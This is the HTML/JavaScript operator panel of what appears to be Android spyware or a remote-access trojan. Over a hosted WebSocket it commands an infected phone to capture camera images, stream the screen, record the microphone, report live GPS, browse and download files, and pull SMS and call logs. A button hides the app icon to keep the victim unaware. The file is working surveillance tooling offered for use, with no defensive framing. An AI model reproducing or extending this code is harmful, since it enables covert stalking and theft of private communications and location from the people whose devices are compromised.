<!DOCTYPE html>
<html>
<head>
    <title>SystemSync GOD Console</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <style>
        /* ===== GLOBAL ===== */
        body{
            margin:0;
            background:radial-gradient(circle at top,#050505,#000);
            color:#00f7ff;
            font-family:Consolas,monospace;
            display:flex;
            height:100vh;
            overflow:hidden;
        }

        /* ===== SIDEBAR ===== */
        #sidebar{
            width:300px;
            background:linear-gradient(180deg,#020202,#000);
            border-right:1px solid #00f7ff22;
            padding:20px;
            box-shadow:0 0 30px #00f7ff11;
            overflow-y:auto;
        }

        .logo{
            font-size:20px;
            letter-spacing:3px;
            margin-bottom:25px;
            color:#00f7ff;
        }

        .section{
            margin-bottom:25px;
        }

        .section-title{
            font-size:11px;
            letter-spacing:2px;
            color:#00f7ff88;
            margin-bottom:10px;
        }

        /* ===== BUTTONS ===== */
        button{
            width:100%;
            padding:10px;
            margin:6px 0;
            background:#000;
            color:#00f7ff;
            border:1px solid #00f7ff55;
            border-radius:6px;
            cursor:pointer;
            transition:.25s;
        }

        button:hover{
            background:#00f7ff;
            color:#000;
            box-shadow:0 0 12px #00f7ff;
        }

        button.small{
            width:auto;
            float:right;
            margin:0 0 0 5px;
            padding:4px 8px;
        }

        /* ===== MAIN ===== */
        #main{
            flex:1;
            display:flex;
            flex-direction:column;
        }

        /* HEADER */
        #header{
            height:60px;
            border-bottom:1px solid #00f7ff22;
            display:flex;
            align-items:center;
            justify-content:space-between;
            padding:0 25px;
            background:#020202;
        }

        .status{
            padding:5px 14px;
            border-radius:20px;
            font-size:12px;
            border:1px solid #00f7ff55;
        }

        /* ===== CONTENT ===== */
        #content{
            flex:1;
            display:flex;
            gap:20px;
            padding:20px;
        }

        /* VIDEO PANEL */
        #video-panel{
            flex:2;
            background:#020202;
            border-radius:12px;
            border:1px solid #00f7ff33;
            box-shadow:0 0 40px #00f7ff11 inset;
            display:flex;
            align-items:center;
            justify-content:center;
            min-height:300px;
        }

        video, img{
            width:100%;
            height:100%;
            object-fit:contain;
            border-radius:12px;
        }

        /* DATA PANEL */
        #data-panel{
            flex:1;
            background:#020202;
            border-radius:12px;
            border:1px solid #00f7ff33;
            overflow-y:auto;
            padding:15px;
        }

        /* DATA CARD */
        .card{
            background:#000;
            border-left:3px solid #00f7ff;
            padding:8px;
            margin-bottom:8px;
            font-size:12px;
            word-break:break-word;
        }

        .card button{
            width:auto;
            float:right;
            margin-left:5px;
            padding:2px 6px;
        }

        /* MAP */
        #map{
            height:300px;
            border-radius:8px;
            margin-bottom:15px;
        }

        /* AUDIO PLAYER */
        audio{
            width:100%;
            margin-top:10px;
        }
    </style>
</head>
<body>

<!-- SIDEBAR -->
<div id="sidebar">
    <div class="logo">SYSTEMSYNC</div>
    <div class="section">
        <div class="section-title">SURVEILLANCE</div>
        <button onclick="startScreen()">üñ• SCREEN MIRROR</button>
        <button onclick="stopScreen()">‚èπ STOP SCREEN</button>
        <button onclick="send('camFront')">üìπ FRONT CAMERA</button>
        <button onclick="send('camBack')">üìπ BACK CAMERA</button>
        <button onclick="send('getLocation')">üìç LIVE GPS</button>
        <button onclick="send('startAudio')">üé§ START MIC</button>
        <button onclick="send('stopAudio')">‚èπ STOP MIC</button>
    </div>
    <div class="section">
        <div class="section-title">DATA</div>
        <button onclick="send('ls root')">üìÇ FILE MANAGER</button>
        <button onclick="send('getSMS inbox')">üí¨ SMS LOGS</button>
        <button onclick="send('getCallLogs')">üìû CALL LOGS</button>
    </div>
    <div class="section">
        <div class="section-title">CONTROL</div>
        <button onclick="send('hideApp')">üëª HIDE APP ICON</button>
        <button onclick="send('showApp')">üëÄ SHOW APP ICON</button>
        <button onclick="send('vibrate 1000')">üì≥ VIBRATE (1s)</button>
    </div>
</div>

<!-- MAIN -->
<div id="main">
    <div id="header">
        <div>GOD CONTROL PANEL</div>
        <div id="status" class="status">CONNECTING...</div>
    </div>
    <div id="content">
        <div id="video-panel">
            <video id="remoteVideo" autoplay playsinline style="display:none;"></video>
            <div id="placeholder">No video feed</div>
        </div>
        <div id="data-panel">
            <div id="map"></div>
            <div id="data"></div>
            <div id="audio-container"></div>
        </div>
    </div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
    // ---------- CONFIGURATION ----------
    const WS_URL = "wss://mirror-view.onrender.com";  // Your Render WebSocket URL

    // ---------- GLOBAL STATE ----------
    let ws;
    let mapInstance = null;
    let pc = null;                     // WebRTC peer connection
    let currentVideoStream = null;      // For screen mirror

    // ---------- CONNECTION ----------
    function connectWebSocket() {
        ws = new WebSocket(WS_URL);

        ws.onopen = () => {
            console.log('WebSocket connected');
            ws.send("I_AM_WEB");
            setStatus("ONLINE");
        };

        ws.onmessage = (event) => {
            const msg = event.data;
            console.log('Received:', msg);

            if (msg.startsWith("STATUS:")) {
                setStatus(msg.substring(7));
            }
            else if (msg.startsWith("LOC_DATA:")) {
                try {
                    const data = JSON.parse(msg.substring(9));
                    renderMap(data);
                } catch (e) {
                    console.error('Invalid location data', e);
                }
            }
            else if (msg.startsWith("FILE_LIST:")) {
                try {
                    const files = JSON.parse(msg.substring(10));
                    renderFiles(files);
                } catch (e) {
                    console.error('Invalid file list', e);
                }
            }
            else if (msg.startsWith("FILE_DATA:")) {
                // For simplicity, offer download
                const base64 = msg.substring(10);
                downloadBase64File(base64, "downloaded_file");
            }
            else if (msg.startsWith("SMS_DATA:")) {
                try {
                    const smsData = JSON.parse(msg.substring(9));
                    renderLogs(smsData, "SMS Logs");
                } catch (e) {
                    console.error('Invalid SMS data', e);
                }
            }
            else if (msg.startsWith("CALL_DATA:")) {
                try {
                    const callData = JSON.parse(msg.substring(10));
                    renderLogs(callData, "Call Logs");
                } catch (e) {
                    console.error('Invalid call logs', e);
                }
            }
            else if (msg.startsWith("CAMERA_IMAGE:")) {
                const base64 = msg.substring(13);
                displayImage(base64);
            }
            else if (msg.startsWith("AUDIO_RECORDING:")) {
                const base64 = msg.substring(16);
                playAudio(base64);
            }
            else if (msg.startsWith("AUDIO_STARTED")) {
                showNotification("Audio recording started");
            }
            else if (msg.startsWith("AUDIO_STOPPED")) {
                showNotification("Audio recording stopped");
            }
            else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
                showNotification("Screen sharing started");
            }
            else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
                stopScreenShare();
                showNotification("Screen sharing stopped");
            }
            else if (msg.startsWith("RTC_OFFER:screen:")) {
                const sdp = msg.substring(17); // after "RTC_OFFER:screen:"
                handleOffer(sdp);
            }
            else if (msg.startsWith("ICE_CANDIDATE:")) {
                const candidateStr = msg.substring(14);
                handleIceCandidate(candidateStr);
            }
            else if (msg.startsWith("ERROR:")) {
                alert("Error: " + msg.substring(6));
            }
            else if (msg.startsWith("APP_HIDDEN")) {
                showNotification("App icon hidden");
            }
            else if (msg.startsWith("APP_SHOWN")) {
                showNotification("App icon shown");
            }
            else if (msg.startsWith("VIBRATE_DONE")) {
                showNotification("Vibration completed");
            }
            else {
                console.log('Unhandled message:', msg);
            }
        };

        ws.onclose = () => {
            console.log('WebSocket disconnected');
            setStatus('OFFLINE');
            setTimeout(connectWebSocket, 5000);
        };

        ws.onerror = (err) => {
            console.error('WebSocket error', err);
        };
    }

    // ---------- COMMAND SENDING ----------
    function send(cmd) {
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(cmd);
        } else {
            alert('Not connected to server');
        }
    }

    // ---------- STATUS UI ----------
    function setStatus(text) {
        const el = document.getElementById('status');
        el.innerText = text;
        el.style.borderColor = text === 'ONLINE' ? '#00ff99' : '#ff4444';
        el.style.color = text === 'ONLINE' ? '#00ff99' : '#ff4444';
    }

    // ---------- MAP ----------
    function renderMap(data) {
        if (mapInstance) mapInstance.remove();
        mapInstance = L.map('map').setView([data.lat, data.lon], 18);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
        L.circle([data.lat, data.lon], { radius: data.acc || data.accuracy, color: '#00f7ff' }).addTo(mapInstance);
    }

    // ---------- FILE BROWSER ----------
    function renderFiles(files) {
        let html = '<h3>File Manager</h3>';
        html += files.map(f => `
            <div class="card">
                ${f.isDir ? 'üìÅ' : 'üìÑ'} ${f.name} (${formatBytes(f.size)})
                <button class="small" onclick="send('${f.isDir ? 'ls ' + f.path : 'dl ' + f.path}')">
                    ${f.isDir ? 'OPEN' : 'DL'}
                </button>
            </div>
        `).join('');
        document.getElementById('data').innerHTML = html;
    }

    function formatBytes(bytes) {
        if (bytes === 0) return '0 B';
        const k = 1024;
        const sizes = ['B', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
    }

    // ---------- LOGS (SMS/Call) ----------
    function renderLogs(data, title) {
        let html = `<h3>${title}</h3>`;
        html += data.map(item => 
            `<div class="card">${JSON.stringify(item, null, 2)}</div>`
        ).join('');
        document.getElementById('data').innerHTML = html;
    }

    // ---------- CAMERA IMAGE ----------
    function displayImage(base64Image) {
        const videoPanel = document.getElementById('video-panel');
        videoPanel.innerHTML = `<img src="data:image/jpeg;base64,${base64Image}" style="max-width:100%; max-height:100%;">`;
    }

    // ---------- AUDIO PLAYBACK ----------
    function playAudio(base64Audio) {
        const audioContainer = document.getElementById('audio-container');
        audioContainer.innerHTML = `
            <audio controls src="data:audio/3gp;base64,${base64Audio}"></audio>
            <button onclick="downloadBase64File('${base64Audio}', 'recording.3gp')">Download Audio</button>
        `;
    }

    // ---------- DOWNLOAD BASE64 FILE ----------
    function downloadBase64File(base64, filename) {
        const link = document.createElement('a');
        link.href = 'data:application/octet-stream;base64,' + base64;
        link.download = filename;
        link.click();
    }

    // ---------- NOTIFICATION (temporary) ----------
    function showNotification(text) {
        const status = document.getElementById('status');
        const original = status.innerText;
        status.innerText = text;
        setTimeout(() => { status.innerText = original; }, 2000);
    }

    // ---------- WEBRTC SCREEN SHARING ----------
    async function startScreen() {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            alert('Not connected');
            return;
        }
        // Send command to device to start screen sharing
        send('START_SCREEN_SHARE');
        // Prepare video panel
        document.getElementById('video-panel').innerHTML = '<video id="remoteVideo" autoplay playsinline></video>';
        showNotification("Waiting for screen stream...");
    }

    function stopScreen() {
        send('STOP_SCREEN_SHARE');
        stopScreenShare();
    }

    function stopScreenShare() {
        if (pc) {
            pc.close();
            pc = null;
        }
        document.getElementById('video-panel').innerHTML = '<div id="placeholder">Screen sharing stopped</div>';
    }

    // WebRTC signaling handlers
    function handleOffer(sdp) {
        console.log('Received offer', sdp);
        // Create peer connection if not exists
        if (!pc) {
            pc = new RTCPeerConnection({
                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
            });

            pc.ontrack = (event) => {
                console.log('Track received');
                const video = document.getElementById('remoteVideo');
                if (video && event.streams && event.streams[0]) {
                    video.srcObject = event.streams[0];
                    video.style.display = 'block';
                }
            };

            pc.onicecandidate = (event) => {
                if (event.candidate) {
                    ws.send('ICE_CANDIDATE:' + JSON.stringify(event.candidate));
                }
            };

            pc.oniceconnectionstatechange = () => {
                console.log('ICE state:', pc.iceConnectionState);
            };
        }

        // Set remote description
        const offer = new RTCSessionDescription({
            type: 'offer',
            sdp: sdp
        });
        pc.setRemoteDescription(offer).then(() => {
            return pc.createAnswer();
        }).then((answer) => {
            return pc.setLocalDescription(answer);
        }).then(() => {
            ws.send('ANSWER:' + pc.localDescription.sdp);
        }).catch(e => console.error('Error handling offer:', e));
    }

    function handleIceCandidate(candidateStr) {
        if (!pc) return;
        try {
            const candidate = new RTCIceCandidate(JSON.parse(candidateStr));
            pc.addIceCandidate(candidate).catch(e => console.error('Error adding ICE candidate:', e));
        } catch (e) {
            console.error('Invalid ICE candidate', e);
        }
    }

    // ---------- INIT ----------
    window.onload = () => {
        connectWebSocket();
    };
</script>
</body>
</html>
